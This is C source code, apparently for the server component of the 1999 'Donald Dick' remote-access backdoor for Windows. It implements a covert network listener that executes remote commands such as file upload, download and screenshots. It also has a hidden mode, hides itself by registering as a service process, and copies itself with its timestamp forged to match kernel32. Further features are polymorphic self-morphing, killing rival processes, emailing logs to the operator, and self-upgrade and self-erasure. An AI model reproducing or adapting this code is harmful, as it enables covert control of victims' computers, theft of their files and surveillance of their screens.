/*
  donald dick server main and related functions
  written by alexander yaworsky
  '99
*/

#include <excpt.h>
#include <windows.h>

#include "md5.h"
#include "paths.h"
#include "options.h"
#include "installer.h"
#include "stringlist.h"
#include "executive.h"
#include "errors.h"
#include "filetime.h"
#include "funccodes.h"
#include "network.h"
#include "resource.h"
#include "stdlib.h"
#include "registry.h"
#include "sm.h"
#include "toolhelp.h"
#include "syslogsender.h"
#include "syslog.h"
#include "switches.h"


typedef DWORD (WINAPI *PREGISTERSERVICEPROCESS)(DWORD,DWORD);


static volatile LONG   ServerConnections;
static volatile LONG   ServerPorts;
static volatile LONG   TotalExceptions;
static volatile LONG   Threads;
static void*    NetCtxs[ MAX_PROTOCOLS * 32 ];
static void*    DgramCtxs[ MAX_PROTOCOLS ];
static int      CtxCount, DgramCtxCount;

static volatile BOOL  RequirePassword = FALSE;
static volatile BOOL  HiddenMode = FALSE;
static char     Password[ 16 ];

static volatile LONG    ShutdownFlag;
static volatile LONG    UpgradeFlag;
static volatile LONG    UninstallFlag = 0;
static char     UpgradeParam[ MAX_PATH ];
static HANDLE   MainThreadEvent, SemH;
static SYSTEMTIME STime;
static char SD[ SECURITY_DESCRIPTOR_MIN_LENGTH ];
static SECURITY_ATTRIBUTES Security;

static BOOL  MailOnce, MailErrors, Mailed;
static char  MailTo[ 64 ] = "", SmtpAddress[ 64 ] = "";
static DWORD HowManyMail = 0;


BOOL RegisterServiceProcess( DWORD p1, DWORD p2 )
  {
    PREGISTERSERVICEPROCESS  rsp;
    CHAR        K32Path[ MAX_PATH ];
    HINSTANCE   hK32;
    BOOL        Rc;

    Rc = FALSE;
    GetKernel32Path( K32Path );
    hK32 = LoadLibrary( K32Path );
    if( hK32 != NULL ) {
      rsp = (PREGISTERSERVICEPROCESS)
                            GetProcAddress( hK32, "RegisterServiceProcess" );
      if( rsp != NULL ) {
        Rc = TRUE;
        rsp( p1, p2 );
      }
      FreeLibrary( hK32 );
    }
    return Rc;
  }


static BOOL ReadPortFromRegistry( int Protocol, char* Buf, int BufSz )
  {
    BOOL   Rc;
    DWORD  BSz;

    BSz = BufSz - 2;
    if( (Rc = RegReadParam( Protocol + 1, Buf, &BSz )) == TRUE ) {
      Buf[ BSz ] = '\0'; Buf[ BSz + 1 ] = '\0';
    }
    return Rc;
  }


static void ReadPasswordFromRegistry() // also reads HiddenMode
  {
    DWORD  BSz;
    BYTE   h;

    RequirePassword = FALSE;
    HiddenMode = FALSE;
    BSz = 16;
    if( RegReadParam( RVAL_ADMIN_PASSWORD, Password, &BSz ) )
      RequirePassword = TRUE;
    BSz = 1;
    if( RegReadParam( RVAL_HIDDEN_MODE, &h, &BSz ) )
      HiddenMode = h;
  }


FUNCDEF( GetInfo )
  {
    char  Buf[ MAX_PATH + 64 ];
    char  AddrBuf[ 64 ];
    char  PortBuf[ 16 ];
    char  *cp, *cpx;
    int   i, j;

    SetReply( Result, ERR_NO_ERROR, "" );
    wsprintf( Buf, "Version %d.%d%s",
              VERSION_MAJOR, VERSION_MINOR, VERSION_TYPE );
    lstrcat( Buf, ", the following protocols are supported: " );
    cpx = NULL;
    for( i = 0; i < MAX_PROTOCOLS; i++ ) {
      cp = GetProtocolName( i );
      if( cp != NULL ) {
        if( cpx != NULL && i > 0 ) lstrcat( Buf, ", " );
        lstrcat( Buf, cp );
        cpx = cp;
      }
    }
    AddToStringList( Result, Buf );
    wsprintf( Buf, "Startup time: %2d/%02d/%4d %2d:%02d:%02d",
                    STime.wDay, STime.wMonth, STime.wYear,
                    STime.wHour, STime.wMinute, STime.wSecond );
    AddToStringList( Result, Buf );
    if( RequirePassword )
      AddToStringList( Result, "Password is required" );
    else
      AddToStringList( Result, "Password is not required" );
    wsprintf( Buf, "Platform: Windows%s", WindowsNT? "NT" : "95/98" );
    AddToStringList( Result, Buf );
    wsprintf( Buf, "%d port(s), %d request(s), %d exception(s)",
              ServerPorts, ServerConnections, TotalExceptions );
    AddToStringList( Result, Buf );
    for( i = j = 0; i < CtxCount; i++ )
      if( NetCtxs[ i ] != NULL ) {
        GetLocalAddress( NetCtxs[ i ], AddrBuf, PortBuf );
        wsprintf( Buf, "Port %d: protocol %s, local address %s:%s",
                  j++, GetProtocolName( GetProtocol( NetCtxs[ i ] ) ),
                  AddrBuf, PortBuf );
        AddToStringList( Result, Buf );
      }
    GetLocalAddress( Ctx, AddrBuf, PortBuf );
    wsprintf( Buf, "This call is being processed by %s on %s:%s",
              GetProtocolName( GetProtocol( Ctx ) ), AddrBuf, PortBuf );
    AddToStringList( Result, Buf );
    return 1;
  }

static void RemovePassword( STRINGLIST* Result )
  {
    if( ! RegWriteParam( RVAL_ADMIN_PASSWORD, NULL, 0 ) )
      SetReply( Result, ERR_CANT_WRITE_PARAM, "" );
    else {
      SetReply( Result, ERR_NO_ERROR, "" );
      RequirePassword = FALSE;
    }
  }


static void SetPassword( STRINGLIST* Result, char* NewPassword )
  {
    MD5_CTX  MD5Ctx;

    while( *NewPassword == ' ' ) NewPassword++;
    if( *NewPassword == '\0' ) {
      RemovePassword( Result );
      return;
    }
    MD5Init( &MD5Ctx );
    MD5Update( &MD5Ctx, NewPassword, lstrlen( NewPassword ) );
    MD5Final( &MD5Ctx );
    if( ! RegWriteParam( RVAL_ADMIN_PASSWORD, MD5Ctx.digest, 16 ) )
      SetReply( Result, ERR_CANT_WRITE_PARAM, "" );
    else {
      SetReply( Result, ERR_NO_ERROR, "" );
      CopyMemory( Password, MD5Ctx.digest, 16 );
      RequirePassword = TRUE;
    }
  }


FUNCDEF( SetPsw )
  {
    if( Params->Count > 1 )
      SetPassword( Result, Params->Value[1] );
    else
      RemovePassword( Result );
    return 1;
  }


FUNCDEF( Hidden )
  {
    BYTE    h = 0;
    char    Msg[16];

    if( Params->Count <= 1 )
      SetReply( Result, ERR_NO_ERROR, "" );
    else {
      h = Strtoul( Params->Value[1], NULL, 0 );
      if( h == 0 ) {
        RegWriteParam( RVAL_HIDDEN_MODE, NULL, 0 );
        SetReply( Result, ERR_NO_ERROR, "" );
        HiddenMode = FALSE;
      }
      else {
        h = TRUE;
        if( ! RegWriteParam( RVAL_HIDDEN_MODE, &h, 1 ) )
          SetReply( Result, ERR_CANT_WRITE_PARAM, "" );
        else {
          SetReply( Result, ERR_NO_ERROR, "" );
          HiddenMode = TRUE;
        }
      }
    }
    wsprintf( Msg, "%d", HiddenMode );
    AddToStringList( Result, Msg );
    return 1;
  }


FUNCDEF( Terminate )
  {
    SetReply( Result, ERR_NO_ERROR, "" );
    InterlockedIncrement( (LPLONG) &ShutdownFlag );
    return 1;
  }


FUNCDEF( Upgrade )
  {
    if( Params->Count > 1 )
      SubstConst( Params->Value[1], UpgradeParam, MAX_PATH );
    else
      UpgradeParam[0] = '\0';
    SetReply( Result, ERR_NO_ERROR, "" );
    InterlockedIncrement( (LPLONG) &UpgradeFlag );
    return 1;
  }


FUNCDEF( Uninstall )
  {
    InterlockedIncrement( (LPLONG) &ShutdownFlag );
    InterlockedIncrement( (LPLONG) &UninstallFlag );
    SetReply( Result, ERR_NO_ERROR, "" );
    return 1;
  }


FUNCDEF( FeedBack )
  {
    BYTE   *Data;
    DWORD  DataSz, Sz, HowMany;
    BYTE   _MailOnce, _Mailed, _MailErrors;
    char   _MailTo[ 64 ], _SmtpAddress[ 64 ];
    char   Buf[ 128 ];
    BOOL   Fail;

    Fail = FALSE;
    if( Params->Count > 1 ) if( lstrlen( Params->Value[1] ) >= 64 ) {
      SetReply( Result, ERR_PARAM_TOO_LONG, "(MailTo)" );
      Fail = TRUE;
    }
    if( Fail == FALSE && Params->Count > 2 )
      if( lstrlen( Params->Value[2] ) >= 64 ) {
        SetReply( Result, ERR_PARAM_TOO_LONG, "(Relay)" );
        Fail = TRUE;
      }
    if( ! Fail ) {
      RegLock();
      Data = RegReadRaw( RegKeyHome, RegValSrvParams, &DataSz, 1024 );
      if( Data == NULL )
        SetReply( Result, ERR_CANT_READ_PARAM, "RegReadRaw" );
      else {
        _MailOnce = MailOnce; _Mailed = Mailed; _MailErrors = MailErrors;
        lstrcpy( _MailTo, MailTo );
        lstrcpy( _SmtpAddress, SmtpAddress );
        HowMany = HowManyMail;
        Sz = 1;
        RegReadParamRaw( Data, DataSz, RVAL_MAIL_ONCE, &_MailOnce, &Sz );
        Sz = 1;
        RegReadParamRaw( Data, DataSz, RVAL_MAILED, &_Mailed, &Sz );
        Sz = 1;
        RegReadParamRaw( Data, DataSz, RVAL_MAIL_ERRORS, &_MailErrors, &Sz );
        Sz = 64;
        RegReadParamRaw( Data, DataSz, RVAL_MAIL_TO, &_MailTo, &Sz );
        Sz = 64;
        RegReadParamRaw( Data, DataSz, RVAL_SMTP, &_SmtpAddress, &Sz );
        Sz = 4;
        RegReadParamRaw( Data, DataSz, RVAL_LOG_RECORDS_MAIL, &HowMany, &Sz );
        if( Params->Count > 1 ) lstrcpy( _MailTo, Params->Value[1] );
        if( Params->Count > 2 ) lstrcpy( _SmtpAddress, Params->Value[2] );
        if( Params->Count > 3 ) _MailOnce = Strtoul( Params->Value[3], NULL, 0 );
        if( Params->Count > 4 ) _Mailed = Strtoul( Params->Value[4], NULL, 0 );
        if( Params->Count > 5 ) _MailErrors = Strtoul( Params->Value[5], NULL, 0 );
        if( Params->Count > 6 ) HowMany = Strtoul( Params->Value[6], NULL, 0 );
        RegWriteParamRaw( Data, &DataSz, RVAL_MAIL_ONCE, &_MailOnce, 1 );
        RegWriteParamRaw( Data, &DataSz, RVAL_MAILED, &_Mailed, 1 );
        RegWriteParamRaw( Data, &DataSz, RVAL_MAIL_ERRORS, &_MailErrors, 1 );
        RegWriteParamRaw( Data, &DataSz, RVAL_MAIL_TO, &_MailTo, lstrlen( _MailTo ) );
        RegWriteParamRaw( Data, &DataSz, RVAL_SMTP, &_SmtpAddress, lstrlen( _SmtpAddress ) );
        RegWriteParamRaw( Data, &DataSz, RVAL_LOG_RECORDS_MAIL, &HowMany, 4 );
        if( RegWriteRaw( RegKeyHome, RegValSrvParams, Data, DataSz ) ) {
          SetReply( Result, ERR_NO_ERROR, "" );
          MailOnce = _MailOnce; Mailed = _Mailed; MailErrors = _MailErrors;
          lstrcpy( MailTo, _MailTo );
          lstrcpy( SmtpAddress, _SmtpAddress );
          HowManyMail = HowMany;
        }
        else
          SetReply( Result, ERR_CANT_WRITE_PARAM, "" );
      }
    }
    wsprintf( Buf, "MailTo: %s", MailTo );
    AddToStringList( Result, Buf );
    wsprintf( Buf, "Relay: %s", SmtpAddress );
    AddToStringList( Result, Buf );
    wsprintf( Buf, "MailOnce: %d; Mailed: %d; MailOnErrors: %d; Records: %d",
              MailOnce, Mailed, MailErrors, HowManyMail );
    AddToStringList( Result, Buf );
    if( ! Fail ) RegUnlock();
    return 1;
  }


static void DoUninstall()
  {
    char   Buf[ MAX_PATH * 2 ];
    PROCESS_INFORMATION  Pinf;
    STARTUPINFO          Sinf;

    UninstallDick( NULL, NULL, NULL, NULL, NULL, NULL );

    // delete self - extract and launch eraser
    GetAnyPath( Buf, EraserFileName );
    ExtractFile( Buf, IDF_ERASER );
    lstrcat( Buf, " " ); lstrcat( Buf, __argv[0] );
    Sinf.cb = sizeof(STARTUPINFO);
    Sinf.lpReserved = NULL;
    Sinf.lpDesktop = NULL;
    Sinf.lpTitle = NULL;
    Sinf.dwFlags = 0;
    Sinf.cbReserved2 = 0;
    Sinf.lpReserved2 = NULL;
    CreateProcess( NULL, Buf, NULL, NULL, FALSE,
                   DETACHED_PROCESS, NULL, NULL, &Sinf, &Pinf );
    CloseHandle( Pinf.hThread );
    CloseHandle( Pinf.hProcess );
  }


static void DoUpgrade()
  {
    static char          ServerPath[ MAX_PATH ];
    static char          ServerExePath[ MAX_PATH ];
    static char          K32Path[ MAX_PATH ];
    SYSTEMTIME           Stm;
    PROCESS_INFORMATION  Pinf;
    STARTUPINFO          Sinf;

    SysLog( "Performing UPGRADE" );

    GetServerPath( ServerPath );
    GetServerExePath( ServerExePath );
    GetKernel32Path( K32Path );

    /* 1. replace ServerPath only if FileName exists, set its date/time
          as it's set for kernel32
    */
    if( (GetFileAttributes( UpgradeParam ) & FILE_ATTRIBUTE_DIRECTORY) == 0 ) {
      CopyFile( UpgradeParam, ServerPath, FALSE );
      DeleteFile( UpgradeParam );
      GetLocalFileTime( K32Path, &Stm );
      SetLocalFileTime( ServerPath, &Stm );
    }

    /* 2. launch Server
    */
    Sinf.cb = sizeof(STARTUPINFO);
    Sinf.lpReserved = NULL;
    Sinf.lpDesktop = NULL;
    Sinf.lpTitle = NULL;
    Sinf.dwFlags = 0;
    Sinf.cbReserved2 = 0;
    Sinf.lpReserved2 = NULL;
    if( WindowsNT ) lstrcat( ServerPath, " UPG" );
    if( ! CreateProcess( NULL, ServerPath, NULL, NULL, FALSE,
                         DETACHED_PROCESS, NULL, NULL, &Sinf, &Pinf ) ) {
      SysLog( "UPGRADE: CreateProcess( %s ) failed, error %d", ServerPath, GetLastError() );
      if( MailErrors ) SendSysLog( MailTo, SmtpAddress, HowManyMail );
    }
    CloseHandle( Pinf.hThread );
    CloseHandle( Pinf.hProcess );
  }


static void ProcessRequest( void* Ctx )
  {
    STRINGLIST Params, Result;
    char       *cp;
    char       Psw[ 256 ];
    ULONG      FuncCode, DelayBefore, DelayAfter, Repeat, Clk;
    int        PasswordOk, SendReply, i;
    MD5_CTX    MD5Ctx;

    OPTLIST    Options[] = { {'d', OPT_ULONG, NULL, sizeof(ULONG)},
                             {'D', OPT_ULONG, NULL, sizeof(ULONG)},
                             {'r', OPT_ULONG, NULL, sizeof(ULONG)},
                             {'p', OPT_STR, NULL, sizeof(Psw)},
                             {'\0', OPT_UNKNOWN, NULL, 0} };

    Options[0].Buffer = &DelayBefore;
    Options[1].Buffer = &DelayAfter;
    Options[2].Buffer = &Repeat;
    Options[3].Buffer = Psw;

    InitStringList( &Params );
    InitStringList( &Result );
    i = RecvStringList( Ctx, &Params );
    SendReply = HiddenMode? 0 : 1;
    if( i == ERRNET2_CRC )
      SetReply( &Result, ERR_BAD_REQUEST_CRC, "" );
    else if( i != ERRNET2_OK )
      SetReply( &Result, ERR_REQUEST_RECEPTION, "" );
    else {
      if( Params.Count < 1 )
        SetReply( &Result, ERR_NEED_FUNCTION_CODE, "" );
      else {
        FuncCode = Strtoul( Params.Value[0], &cp, 0 );
        // get options
        DelayBefore = DelayAfter = 0;
        Repeat = 1;
        Psw[0] = '\0';
        OptRead( cp, Options );
        if( FuncCode == FUNC_UPLOAD || FuncCode == FUNC_DOWNLOAD ||
            FuncCode == FUNC_SCREENSHOT || FuncCode == FUNC_WINSHOT )
          Repeat = 1;
        PasswordOk = 1;
        if( RequirePassword ) {
          MD5Init( &MD5Ctx );
          MD5Update( &MD5Ctx, Psw, lstrlen( Psw ) );
          MD5Final( &MD5Ctx );
          if( Memcmp( Password, MD5Ctx.digest, 16 ) != 0 ) {
            if( ! (HiddenMode == 0 &&
                   (FuncCode == FUNC_ECHO || FuncCode == FUNC_INFO)) ) {
              SetReply( &Result, ERR_INVALID_PASSWORD, "" );
              PasswordOk = 0;
            }
          }
        }
        if( PasswordOk ) {
          if( FuncCode < 1 || FuncCode > FuncTableSz )
            SetReply( &Result, ERR_INVALID_FUNCCODE, "" );
          else {
            for( i = 0; i < Repeat; i++ ) {
              FreeStringList( &Result );
              InitStringList( &Result );
              if( DelayBefore > 0 ) {
                Clk = GetTickCount();
                while( GetTickCount() - Clk < DelayBefore
                       && ShutdownFlag == 0 ) Sleep( 60 );
              }
              if( ShutdownFlag ) break;
              SendReply = FuncTable[ FuncCode - 1 ]( Ctx, &Params, &Result );
              if( DelayAfter > 0 && i < Repeat - 1 ) {
                Clk = GetTickCount();
                while( GetTickCount() - Clk < DelayAfter
                       && ShutdownFlag == 0 ) Sleep( 60 );
              }
            }
          }
        }
      }
    }
    if( SendReply ) SendStringList( Ctx, &Result );
    FreeStringList( &Result );
    FreeStringList( &Params );
  }


static unsigned __stdcall ServerConnectionThread( void* Ctx )
  {
    InterlockedIncrement( (LPLONG) &Threads );
    InterlockedIncrement( (LPLONG) &ServerConnections );
    _try {
      SetEvent( MainThreadEvent );
      Sleep(0);
      _try {
        ProcessRequest( Ctx );
      }
      _except (EXCEPTION_EXECUTE_HANDLER) {
        InterlockedIncrement( (LPLONG) &TotalExceptions );
        SysLog( "ServerConnectionThread: ProcessRequest caused an exception %08X", GetExceptionCode() );
      }
      ClosePort( Ctx );
      DeallocateContext( Ctx );
    }
    _except (EXCEPTION_EXECUTE_HANDLER) {
      SysLog( "ServerConnectionThread: EXCEPTION %08X", GetExceptionCode() );
    }
    InterlockedDecrement( (LPLONG) &ServerConnections );
    InterlockedDecrement( (LPLONG) &Threads );
    SetEvent( MainThreadEvent );
    Sleep(0);
    ExitThread( 0 );
    return 0;
  }


static unsigned __stdcall BcastReplyThread( void* Arg )
  {
    int        Index = (int) Arg;
    char       AddrBuf[ 64 ];
    char       PortBuf[ 16 ];
    int        Rcvd;
    char       Buf[ 512 ];

    InterlockedIncrement( (LPLONG) &Threads );
    _try {
      if( ! OpenDgramPort( DgramCtxs[ Index ] ) )
        SysLog( "BcastReplyThread(%d): cannot open port", Index );
      else {
        GetLocalAddress( DgramCtxs[ Index ], AddrBuf, PortBuf );
        SysLog( "Broadcast listener %d is up on %s, %s:%s",
                Index, GetProtocolName( GetProtocol( NetCtxs[ Index ] ) ),
                AddrBuf, PortBuf );
        for(;;) {
          Rcvd = RecvData( DgramCtxs[ Index ], Buf, 512 );
          if( Rcvd == -1 ) break;
          if( HiddenMode == FALSE && Rcvd == 4 &&
              Buf[0] == '?' && Buf[1] == '?' &&
              Buf[2] == '?' && Buf[3] == '?' ) {
            GetDgramSrcAddress( DgramCtxs[ Index ], AddrBuf, PortBuf );
            SetPeerAddress( DgramCtxs[ Index ], AddrBuf, PortBuf );
            wsprintf( Buf, "%d.%d%s",
                      VERSION_MAJOR, VERSION_MINOR, VERSION_TYPE );
            Sleep( (AddrBuf[ lstrlen( AddrBuf ) - 1 ] * 61
                   + GetTickCount() % 120 ) % 300 );
            SendData( DgramCtxs[ Index ], Buf, lstrlen( Buf ) + 1 );
          }
        }
      }
    }
    _except (EXCEPTION_EXECUTE_HANDLER) {
      SysLog( "BcastReplyThread: EXCEPTION %08X", GetExceptionCode() );
    }
    InterlockedDecrement( (LPLONG) &Threads );
    ExitThread( 0 );
    return 0;
  }


static unsigned __stdcall ServerProtocolThread( void* Arg )
  {
    int        Index = (int) Arg;
    DWORD      thrid;
    HANDLE     Th;
    char       AddrBuf[ 64 ];
    char       PortBuf[ 16 ];

    InterlockedIncrement( (LPLONG) &Threads );
    InterlockedIncrement( (LPLONG) &ServerPorts );
    _try {
      if( ! OpenPort( NetCtxs[ Index ] ) )
        SysLog( "ServerProtocolThread(%d): cannot open port", Index );
      else {
        if( ! ListenForConnection( NetCtxs[ Index ] ) )
          SysLog( "ServerProtocolThread(%d): ListenForConnection failed", Index );
        else {
          GetLocalAddress( NetCtxs[ Index ], AddrBuf, PortBuf );
          SysLog( "Thread %d is listening for connection on %s, %s:%s",
                  Index, GetProtocolName( GetProtocol( NetCtxs[ Index ] ) ),
                  AddrBuf, PortBuf );

          while( (Arg = AcceptConnection( NetCtxs[ Index ] )) != NULL ) {
            Th = CreateThread( NULL, 16384,
                            ServerConnectionThread, Arg, 0, &thrid );
            if( Th == NULL ) {
              ClosePort( Arg );
              DeallocateContext( Arg );
              SysLog( "ServerProtocolThread(%d): CreateThread failed, error %d",
                      Index, GetLastError() );
            }
            else
              CloseHandle( Th );
          }
        }
        ClosePort( NetCtxs[ Index ] );
        NetCtxs[ Index ] = NULL;
      }
      DeallocateContext( NetCtxs[ Index ] );
      NetCtxs[ Index ] = NULL;
    }
    _except (EXCEPTION_EXECUTE_HANDLER) {
      SysLog( "ServerProtocolThread(%d): EXCEPTION %08X", Index, GetExceptionCode() );
    }
    InterlockedDecrement( (LPLONG) &ServerPorts );
    InterlockedDecrement( (LPLONG) &Threads );
    SetEvent( MainThreadEvent );
    Sleep(0);
    ExitThread( 0 );
    return 0;
  }


static void ServerMain()
  {
    int        Protocol;
    char       PortBuf[ 256 ];
    char       *Port, *cp;
    HANDLE     Events[2], Th;
    DWORD      Rc, thrid;

    _try {
      SysLog( "ServerMain: v%d.%d%s startup message; %s %s %s %s %s %s %s %s",
              VERSION_MAJOR, VERSION_MINOR, VERSION_TYPE,
              ServerFileName, ServerExeFileName, LoaderFileName,
              ACLFileName, RegKeyHome, RegValSrvParams, RegValChatData,
              EventName );
      GetLocalTime( &STime );
      SemH = CreateEvent( &Security, FALSE, FALSE, CharUpper( EventName ) );
      if( GetLastError() != 0 ) {
        SysLog( "ServerMain: server is already running" );
        if( MailErrors ) SendSysLog( MailTo, SmtpAddress, HowManyMail );
        return;
      }
      ReadPasswordFromRegistry();
      MainThreadEvent = CreateEvent( NULL, FALSE, FALSE, NULL );
      if( MainThreadEvent == NULL ) {
        SysLog( "ServerMain: CreateEvent failed, error %d", GetLastError() );
        if( MailErrors ) SendSysLog( MailTo, SmtpAddress, HowManyMail );
        return;
      }
      ShutdownFlag = 0; UpgradeFlag = 0; UninstallFlag = 0;
      if( ! NetInit() )
        SysLog( "ServerMain: network subsystem initialization failed" );
      else {
        /* Launch separate thread for each protocol and port
        */
        ServerPorts = 0; ServerConnections = 0; TotalExceptions = 0;
        Threads = 0;
        CtxCount = 0;
        DgramCtxCount = 0;
        for( Protocol = 0; Protocol < MAX_PROTOCOLS; Protocol++ ) {
          if( ! ReadPortFromRegistry( Protocol, PortBuf, sizeof(PortBuf) ) ) {
            Port = GetDefaultPort( Protocol );
            if( Port == NULL ) continue;
            lstrcpy( PortBuf, Port );
            PortBuf[ lstrlen( PortBuf ) + 1 ] = '\0';
          }
          Port = PortBuf;
          while( *Port != '\0' &&
                 CtxCount < (sizeof(NetCtxs)/sizeof(NetCtxs[0])) ) {
            if( (*Port == 'B' || *Port == 'b') &&
                DgramCtxCount < (sizeof(DgramCtxs)/sizeof(DgramCtxs[0])) ) {
              DgramCtxs[ DgramCtxCount ] = AllocateContext( Protocol );
              if( DgramCtxs[ DgramCtxCount ] == NULL )
                SysLog( "ServerMain: AllocateContext for datagramm listener failed" );
              else {
                SetLocalPort( DgramCtxs[ DgramCtxCount ], Port + 1 );
                SysLog( "ServerMain: bcast listener index %d, protocol %s, port %s",
                        DgramCtxCount, GetProtocolName( Protocol ), Port + 1 );
                Th = CreateThread( NULL, 4096, BcastReplyThread,
                                   (void*) DgramCtxCount, 0, &thrid );
                if( Th != 0 ) {
                  CloseHandle( Th );
                  DgramCtxCount++;
                }
                else {
                  DeallocateContext( DgramCtxs[ DgramCtxCount ] );
                  DgramCtxs[ DgramCtxCount ] = NULL;
                  SysLog( "ServerMain: CreateThread failed, error %d", GetLastError() );
                }
              }
            }
            else {
              NetCtxs[ CtxCount ] = AllocateContext( Protocol );
              if( NetCtxs[ CtxCount ] == NULL )
                SysLog( "ServerMain: AllocateContext failed" );
              else {
                if( *Port == 'D' || *Port == 'd' )
                  cp = GetDefaultPort( Protocol );
                else
                  cp = Port;
                SetLocalPort( NetCtxs[CtxCount], cp );
                SysLog( "ServerMain: index %d, protocol %s, port %s",
                        CtxCount, GetProtocolName( Protocol ), cp );
                Th = CreateThread( NULL, 4096, ServerProtocolThread,
                                   (void*) CtxCount, 0, &thrid );
                if( Th != 0 ) {
                  CloseHandle( Th );
                  CtxCount++;
                }
                else {
                  DeallocateContext( NetCtxs[ CtxCount ] );
                  NetCtxs[ CtxCount ] = NULL;
                  SysLog( "ServerMain: CreateThread failed, error %d", GetLastError() );
                }
              }
            }
            Port += lstrlen( Port ) + 1;
          }
        }
        /* Monitor server state
        */
        Sleep( 1000 );
        if( ServerPorts == 0 ) {
          SysLog( "ServerMain: 0 ports, exiting" );
          if( MailErrors ) SendSysLog( MailTo, SmtpAddress, HowManyMail );
        }
        else {
          SysLog( "ServerMain: %d ports, server is up", ServerPorts );
          if( (MailOnce == FALSE) || (MailOnce == TRUE && Mailed == FALSE) ) {
            if( SendSysLog( MailTo, SmtpAddress, HowManyMail ) ) {
              Mailed = TRUE;
              RegWriteParam( RVAL_MAILED, &Mailed, 1 );  // mailed: LSB
            }
          }
        }
        while( ServerPorts != 0 ) {
          Events[0] = SemH;
          Events[1] = MainThreadEvent;
          Rc = WaitForMultipleObjects( 2, Events, FALSE, 5000 );
          if( Rc == WAIT_OBJECT_0 || Rc == WAIT_ABANDONED_0 ) {
            SysLog( "ServerMain: termination request" );
            break;
          }
          if( UpgradeFlag ) break;
          if( ShutdownFlag ) break;
        }
        for( Protocol = 0; Protocol < CtxCount; Protocol++ )
          if( NetCtxs[ Protocol ] != NULL ) ClosePort( NetCtxs[ Protocol ] );
        for( Protocol = 0; Protocol < DgramCtxCount; Protocol++ )
          if( DgramCtxs[ Protocol ] != NULL ) ClosePort( DgramCtxs[ Protocol ] );
        while( Threads != 0 ) Sleep( 60 );
        NetDeinit();
      }
      CloseHandle( MainThreadEvent );
      CloseHandle( SemH );
      if( UninstallFlag ) DoUninstall();
      else if( UpgradeFlag ) DoUpgrade();
      SysLog( "ServerMain: server is down" );
    }
    _except( EXCEPTION_EXECUTE_HANDLER ) {
      _try {
        SysLog( "ServerMain: EXCEPTION %08X", GetExceptionCode() );
        if( MailErrors ) SendSysLog( MailTo, SmtpAddress, HowManyMail );
      }
      _except( EXCEPTION_EXECUTE_HANDLER ) {
        ;
      }
    }
  }


static void xKillByName( char* ExeFile )
  {
    HANDLE          Shh, Ph;
    PROCESSENTRY32  Pe;
    DWORD           Pid;
    BOOL            Terminated = FALSE;
    char            *cp;

    Shh = ThCreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
    if( Shh == INVALID_HANDLE_VALUE ) return;
    Pid = GetCurrentProcessId();
    Pe.dwSize = sizeof( Pe );
    if( ThProcess32First( Shh, &Pe ) ) {
      do {
        cp = ExeFile;
        if( lstrlen( cp ) > lstrlen( Pe.szExeFile ) )
          cp = ExeFile + lstrlen( cp ) - lstrlen( Pe.szExeFile );
        if( lstrcmpi( Pe.szExeFile, cp ) == 0
            && Pe.th32ProcessID != Pid ) {
          Terminated = TRUE;
          Ph = OpenProcess( PROCESS_ALL_ACCESS, FALSE, Pe.th32ProcessID );
          if( Ph != NULL ) {
            TerminateProcess( Ph, 0 );
            CloseHandle( Ph );
          }
        }
      } while( ThProcess32Next( Shh, &Pe ) );
    }
    ThCloseHandle( Shh );
  }


/*
static BOOL xCopyFile( char* Src, char* Dst, SYSTEMTIME* Ftime, int AddSize )
  {
    char     *buf;
    HANDLE   *h1, *h2;
    int      sz, Success, j;

    Success = FALSE;
    h1 = CreateFile( Src, GENERIC_READ,
                     FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL );
    if( h1 != INVALID_HANDLE_VALUE ) {
      sz = GetFileSize( h1, NULL );
      h2 = CreateFile( Dst, GENERIC_READ | GENERIC_WRITE,
                       0, NULL, OPEN_ALWAYS, 0, NULL );
      if( h2 != INVALID_HANDLE_VALUE ) {
        buf = (char*) LocalAlloc( LMEM_FIXED, sz );
        if( buf != NULL ) {
          if( ReadFile( h1, buf, sz, (LPDWORD) &j, NULL ) && j == sz )
            if( WriteFile( h2, buf, sz, (LPDWORD) &j, NULL ) && j == sz  )
              if( WriteFile( h2, (void*) ProcessRequest,
                             AddSize, (LPDWORD) &j, NULL ) )
                Success = TRUE;
          LocalFree( buf );
        }
        CloseHandle( h2 );
        if( ! Success )
          DeleteFile( Dst );
        else
          SetLocalFileTime( Dst, Ftime );
      }
      CloseHandle( h1 );
    }
    return (BOOL) Success;
  }
*/


static void Launch()
  {
    char     DupPath[ MAX_PATH ];
    char     TmpPath[ MAX_PATH ];
    SYSTEMTIME           Stm;
    PROCESS_INFORMATION  Pinf;
    STARTUPINFO          Sinf;
    HANDLE               Fh;
    BOOL                 b;
    int  i;

    _try {
      GetServerExePath( DupPath );
      GetKernel32Path( TmpPath );
      GetLocalFileTime( TmpPath, &Stm );

      /* 1. copy self to ServerExe, set its date/time as it's set for kernel32
      */
      for( i = 0; i < 100; i++ ) {
        RequireTermination( EventName );
        Fh = CreateFile( DupPath, GENERIC_READ | GENERIC_WRITE,
                         0, NULL, OPEN_ALWAYS, 0, NULL );
        if( Fh != INVALID_HANDLE_VALUE ) break;
        Sleep(60);
      }
      if( i == 100 ) {
        xKillByName( DupPath );
        Sleep( 1000 );
        Fh = CreateFile( DupPath, GENERIC_READ | GENERIC_WRITE,
                         0, NULL, OPEN_ALWAYS, 0, NULL );
      }
      b = SM_MorphServer( Fh, 0, NULL, NULL, NULL );
      CloseHandle( Fh );
      if( ! b ) DeleteFile( DupPath );

      /* 2. launch ServerExe
      */
      Sinf.cb = sizeof(STARTUPINFO);
      Sinf.lpReserved = NULL;
      Sinf.lpDesktop = NULL;
      Sinf.lpTitle = NULL;
      Sinf.dwFlags = 0;
      Sinf.cbReserved2 = 0;
      Sinf.lpReserved2 = NULL;
      lstrcat( DupPath, " SERVE" );
      if( ! CreateProcess( NULL, DupPath, NULL, NULL, FALSE,
                           DETACHED_PROCESS, NULL, NULL, &Sinf, &Pinf ) ) {
        SysLog( "Launch: CreateProcess( %s ) failed, error %d", DupPath, GetLastError() );
        if( MailErrors ) SendSysLog( MailTo, SmtpAddress, HowManyMail );
      }
      CloseHandle( Pinf.hThread );
      CloseHandle( Pinf.hProcess );
    }
    _except( EXCEPTION_EXECUTE_HANDLER ) {
      _try {
        SysLog( "Launch: EXCEPTION %08X", GetExceptionCode() );
        if( MailErrors ) SendSysLog( MailTo, SmtpAddress, HowManyMail );
      }
      _except( EXCEPTION_EXECUTE_HANDLER ) {
        ;
      }
    }
  }

/*
